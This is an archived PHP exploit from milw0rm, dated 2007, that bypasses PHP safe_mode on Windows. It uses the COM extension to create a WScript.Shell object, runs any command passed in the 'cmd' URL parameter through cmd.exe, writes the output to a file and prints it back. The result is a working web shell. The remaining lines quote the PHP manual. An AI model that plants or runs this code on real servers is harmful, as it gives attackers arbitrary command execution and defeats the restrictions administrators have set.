<?php
   //PHP COM extensions (inconsistent Win32) safe_mode bypass

    $____suntzu = new COM("WScript.Shell");
    $____suntzu->Run('c:\windows\system32\cmd.exe /c '.escapeshellarg($_GET[cmd]).' > '.dirname($_SERVER[SCRIPT_FILENAME]).'/suntzoi.txt');
    $____suntzoi=file("suntzoi.txt");
    for ($i=0; $i<count($____suntzoi); $i++) {echo nl2br(htmlentities($____suntzoi[$i]));}

   // *quote* from the php manual:
   // There is no installation needed to use these functions; they are part of the PHP core.

   // The windows version of PHP has built in support for this extension. You do not need to load any additional extension in order to use these functions.

   // You are responsible for installing support for the various COM objects that you intend to use (such as MS Word);
   // we don't and can't bundle all of those with PHP.
?>

# milw0rm.com [2007-03-07]
